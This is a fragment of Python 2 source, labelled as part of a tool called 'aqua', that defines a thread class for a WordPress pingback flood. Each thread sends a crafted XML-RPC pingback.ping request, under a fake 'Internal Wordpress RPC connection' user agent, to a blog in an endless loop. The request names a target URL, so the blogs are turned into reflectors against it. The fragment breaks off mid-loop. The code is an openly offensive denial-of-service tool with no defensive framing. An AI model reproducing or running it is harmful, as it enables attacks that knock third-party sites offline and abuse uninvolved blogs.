# Part of aqua
class Thread1(threading.Thread):
        def __init__(self, url, number, blog):
                self.url = url
                self.number = number
                self.blog = blog
                threading.Thread.__init__(self)
           
        def run(self):
                Lock.acquire()
                print 'Starting thread #%s'%self.number
                Lock.release()
                function_pingback = "<?xml version='1.0' encoding='iso-8859-1'?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>%s</string></value></param><param><value><string>%s</string></value></param></params></methodCall>"%(self.url, self.blog)
                request_lenght = len(function_pingback)
                try:
                        self.blog_cleaned = self.blog.split("?p=")[0]
                        self.blog_cleaned1 = self.blog_cleaned.split("http://")[1].split("/")[0]
                except:
                        sys.exit(0)
                request = "POST %s/HTTP/1.0\r\nHost: %s\r\nUser-Agent: Internal Wordpress RPC connection\r\nContent-Type: text/xml\r\nContent-Length: %s\r\n\n<?xml version=\"1.0\" encoding=\"iso-8859-1\"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>%s</string></value></param><param><value><string>%s</string></value></param></params></methodCall>\r\n\r\n"%(self.blog_cleaned, self.blog_cleaned1, request_lenght, self.url, self.blog)
                while True:
                                time.sleep(2)
                                try:
                                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.SOL_TCP)
                                        s.connect((self.blog_cleaned1, 80))
                                        s.send(request)
                                        print"Thread %s | Blog %s"%(self.number, self.blog_cleaned1)
           
